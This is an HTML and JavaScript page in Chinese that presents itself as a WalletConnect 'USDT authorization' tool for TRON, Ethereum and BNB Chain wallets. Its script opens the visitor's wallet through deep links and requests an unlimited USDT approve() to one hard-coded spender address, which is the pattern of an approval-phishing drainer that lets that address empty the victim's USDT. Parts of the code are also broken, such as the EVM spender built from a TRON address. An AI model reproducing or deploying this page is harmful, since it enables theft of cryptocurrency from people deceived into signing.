<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>多链钱包授权 - WalletConnect</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .card {
            background: white;
            border-radius: 24px;
            padding: 24px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 28px;
            color: #333;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 24px;
        }
        
        .chain-selector {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }
        
        .chain-btn {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            background: white;
            border-radius: 12px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
        }
        
        .chain-btn.active {
            border-color: #667eea;
            background: #f0f0ff;
            color: #667eea;
        }
        
        .wallet-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }
        
        .wallet-item {
            display: flex;
            align-items: center;
            padding: 16px;
            border: 1px solid #e0e0e0;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            background: white;
        }
        
        .wallet-item.selected {
            border-color: #667eea;
            background: #f8f9ff;
        }
        
        .wallet-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 16px;
            font-size: 24px;
        }
        
        .wallet-info {
            flex: 1;
        }
        
        .wallet-name {
            font-weight: 600;
            color: #333;
            margin-bottom: 4px;
        }
        
        .wallet-chains {
            font-size: 12px;
            color: #999;
        }
        
        .approve-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .approve-btn:active {
            transform: scale(0.98);
        }
        
        .status {
            margin-top: 16px;
            padding: 12px;
            border-radius: 12px;
            font-size: 14px;
            text-align: center;
        }
        
        .status.loading {
            background: #fff3cd;
            color: #856404;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
        }
        
        .info-text {
            font-size: 12px;
            color: #999;
            margin-top: 12px;
            text-align: center;
            padding: 8px;
            background: #f5f5f5;
            border-radius: 8px;
        }
        
        .hidden {
            display: none;
        }
        
        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 8px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>🔐 USDT 授权</h1>
            <div class="subtitle">WalletConnect - 支持 TRON + EVM</div>
            
            <div class="chain-selector" id="chainSelector">
                <button class="chain-btn" data-chain="1">Ethereum</button>
                <button class="chain-btn" data-chain="56">BNB Chain</button>
                <button class="chain-btn active" data-chain="728126428">TRON</button>
            </div>
            
            <div class="wallet-list" id="walletList"></div>
            
            <div style="background: #f5f5f5; padding: 12px; border-radius: 12px; margin-bottom: 16px;">
                <div style="font-size: 12px; color: #666;">授权地址</div>
                <div style="font-size: 12px; color: #333; word-break: break-all;" id="spenderAddress">TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA</div>
                <div style="font-size: 12px; color: #666; margin-top: 8px;">授权额度</div>
                <div style="font-size: 14px; color: #667eea; font-weight: 600;">无限额度</div>
            </div>
            
            <button class="approve-btn" id="approveBtn">连接钱包并授权</button>
            <div class="status hidden" id="status"></div>
            <div class="info-text" id="walletInfo">请选择链和钱包</div>
        </div>
    </div>

    <!-- 引入 WalletConnect 相关库 -->
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.0/dist/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
    
    <script>
        // ==================== 配置 ====================
        // WalletConnect Project ID
        const PROJECT_ID = '91bd623c7859e77a38c7b10c615976b6';
        
        // USDT 合约地址
        const USDT_ADDRESS = {
            1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',   // Ethereum
            56: '0x55d398326f99059fF775485246999027B3197955',  // BSC
            728126428: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'    // TRON
        };
        
        // 授权目标地址
        const SPENDER_ADDRESS = {
            evm: '0x000000000000000000000000TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA',
            tron: 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA'
        };
        
        // 无限额度
        const UNLIMITED_AMOUNT_EVM = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        const UNLIMITED_AMOUNT_TRON = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        
        // 钱包列表
        const walletList = [
            { key: 'metamask', name: 'MetaMask', icon: '🦊', chains: ['evm'], scheme: 'metamask://' },
            { key: 'tokenpocket', name: 'TokenPocket', icon: '🎫', chains: ['evm', 'tron'], scheme: 'tp://' },
            { key: 'imtoken', name: 'imToken', icon: '🔷', chains: ['evm', 'tron'], scheme: 'imtokenv2://' },
            { key: 'trust', name: 'Trust Wallet', icon: '🔒', chains: ['evm'], scheme: 'trust://' },
            { key: 'tronlink', name: 'TronLink', icon: '🌊', chains: ['tron'], scheme: 'tronlink://' }
        ];
        
        let currentChain = '728126428';
        let selectedWallet = null;
        
        function showStatus(message, type = 'loading') {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${message}` : message;
            statusEl.className = `status ${type}`;
            statusEl.classList.remove('hidden');
        }
        
        function hideStatus() {
            document.getElementById('status').classList.add('hidden');
        }
        
        function updateWalletInfo(text) {
            document.getElementById('walletInfo').textContent = text;
        }
        
        function isMobile() {
            return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        }
        
        // ==================== 发起 WalletConnect 连接 ====================
        async function connectAndApprove() {
            if (!selectedWallet) {
                showStatus('请先选择钱包', 'error');
                return;
            }
            
            const wallet = walletList.find(w => w.key === selectedWallet);
            const chainId = parseInt(currentChain);
            const isTron = chainId === 728126428;
            
            showStatus(`正在初始化连接...`, 'loading');
            updateWalletInfo('正在生成连接请求');
            
            try {
                // 创建 WalletConnect 实例
                const { EthereumProvider } = window;
                
                // 创建以太坊提供者（也支持 TRON 通过 WalletConnect）
                const provider = await EthereumProvider.init({
                    projectId: PROJECT_ID,
                    chains: isTron ? [728126428] : [chainId],
                    optionalChains: isTron ? [] : [1, 56],
                    showQrModal: false,
                    qrModalOptions: {
                        themeMode: 'light'
                    },
                    metadata: {
                        name: 'Wallet Connector',
                        description: 'Multi-chain wallet connector',
                        url: window.location.origin,
                        icons: ['https://avatars.githubusercontent.com/u/37784886']
                    }
                });
                
                // 构建 Deep Link
                const wcUri = provider.uri;
                if (!wcUri) {
                    throw new Error('无法生成连接 URI');
                }
                
                console.log('WC URI:', wcUri);
                console.log('Wallet:', wallet.key);
                
                // 根据钱包生成不同的 Deep Link
                let deepLink = '';
                const encodedUri = encodeURIComponent(wcUri);
                
                switch(selectedWallet) {
                    case 'metamask':
                        deepLink = `metamask://wc?uri=${encodedUri}`;
                        break;
                    case 'tokenpocket':
                        deepLink = `tp://wc?wc_uri=${encodedUri}`;
                        break;
                    case 'imtoken':
                        deepLink = `imtokenv2://wc?uri=${encodedUri}`;
                        break;
                    case 'trust':
                        deepLink = `trust://wc?uri=${encodedUri}`;
                        break;
                    case 'tronlink':
                        deepLink = `tronlink://wc?uri=${encodedUri}`;
                        break;
                    default:
                        deepLink = wcUri;
                }
                
                showStatus(`正在唤起 ${wallet.name}...`, 'loading');
                updateWalletInfo('正在唤起钱包，请在钱包中确认');
                
                // 跳转到钱包
                window.location.href = deepLink;
                
                // 监听连接事件
                provider.on('connect', async (session) => {
                    console.log('连接成功:', session);
                    updateWalletInfo('连接成功，正在发送授权交易...');
                    
                    // 发送授权交易
                    if (isTron) {
                        // TRON 授权
                        showStatus('正在发送 TRON 授权交易...', 'loading');
                        try {
                            const tronWeb = new TronWeb({
                                fullHost: 'https://api.trongrid.io'
                            });
                            
                            const contract = await tronWeb.contract().at(USDT_ADDRESS[chainId]);
                            
                            const transaction = await contract.approve(
                                SPENDER_ADDRESS.tron,
                                UNLIMITED_AMOUNT_TRON
                            ).send();
                            
                            // 通过 WalletConnect 发送
                            const result = await provider.request({
                                method: 'tron_signTransaction',
                                params: [transaction]
                            });
                            
                            if (result) {
                                showStatus(`✅ 授权成功！`, 'success');
                                updateWalletInfo(`授权成功！交易ID: ${result.slice(0, 10)}...`);
                            }
                        } catch (err) {
                            console.error('TRON 授权错误:', err);
                            showStatus('授权失败: ' + err.message, 'error');
                        }
                    } else {
                        // EVM 授权
                        showStatus('正在发送 EVM 授权交易...', 'loading');
                        try {
                            const ethersProvider = new ethers.providers.Web3Provider(provider);
                            const signer = ethersProvider.getSigner();
                            
                            const usdtContract = new ethers.Contract(
                                USDT_ADDRESS[chainId],
                                ['function approve(address spender, uint256 amount) returns (bool)'],
                                signer
                            );
                            
                            const spenderEvm = '0x' + SPENDER_ADDRESS.tron.slice(2);
                            
                            const tx = await usdtContract.approve(spenderEvm, UNLIMITED_AMOUNT_EVM);
                            await tx.wait();
                            
                            showStatus(`✅ 授权成功！`, 'success');
                            updateWalletInfo(`授权成功！交易ID: ${tx.hash.slice(0, 10)}...`);
                        } catch (err) {
                            console.error('EVM 授权错误:', err);
                            showStatus('授权失败: ' + err.message, 'error');
                        }
                    }
                });
                
                provider.on('disconnect', () => {
                    console.log('连接断开');
                    updateWalletInfo('连接已断开');
                });
                
                // 设置超时
                setTimeout(() => {
                    if (!document.hidden && !document.webkitHidden) {
                        updateWalletInfo('未检测到钱包响应，请确保钱包已安装');
                    }
                }, 5000);
                
            } catch (error) {
                console.error('连接失败:', error);
                showStatus('连接失败: ' + error.message, 'error');
                updateWalletInfo('连接失败，请重试');
            }
        }
        
        // ==================== UI 渲染 ====================
        function renderWalletList() {
            const chainId = parseInt(currentChain);
            const isTron = chainId === 728126428;
            
            const filteredWallets = walletList.filter(wallet => 
                isTron ? wallet.chains.includes('tron') : wallet.chains.includes('evm')
            );
            
            const container = document.getElementById('walletList');
            container.innerHTML = filteredWallets.map(wallet => `
                <div class="wallet-item" data-wallet="${wallet.key}">
                    <div class="wallet-icon">${wallet.icon}</div>
                    <div class="wallet-info">
                        <div class="wallet-name">${wallet.name}</div>
                        <div class="wallet-chains">${wallet.chains.join(', ')}</div>
                    </div>
                </div>
            `).join('');
            
            document.querySelectorAll('.wallet-item').forEach(item => {
                item.addEventListener('click', () => {
                    selectedWallet = item.dataset.wallet;
                    document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
                    item.classList.add('selected');
                    hideStatus();
                    const walletName = filteredWallets.find(w => w.key === selectedWallet)?.name || selectedWallet;
                    updateWalletInfo(`已选择 ${walletName}，点击按钮授权`);
                });
            });
        }
        
        // ==================== 初始化 ====================
        function init() {
            // 链选择器
            document.querySelectorAll('.chain-btn').forEach(btn => {
                btn.addEventListener('click', () => {
                    document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    currentChain = btn.dataset.chain;
                    selectedWallet = null;
                    renderWalletList();
                    hideStatus();
                    
                    const chainId = parseInt(currentChain);
                    if (chainId === 728126428) {
                        updateWalletInfo('TRON 链已就绪，选择钱包后点击授权');
                        document.getElementById('spenderAddress').textContent = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
                    } else {
                        updateWalletInfo(`${chainId === 1 ? 'Ethereum' : 'BNB Chain'} 已就绪，选择钱包后点击授权`);
                        document.getElementById('spenderAddress').textContent = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA (EVM)';
                    }
                });
            });
            
            document.getElementById('approveBtn').addEventListener('click', connectAndApprove);
            renderWalletList();
            updateWalletInfo('请选择链和钱包');
            
            if (!isMobile()) {
                updateWalletInfo('请使用手机访问以获得最佳体验');
            }
        }
        
        init();
    </script>
</body>
</html>
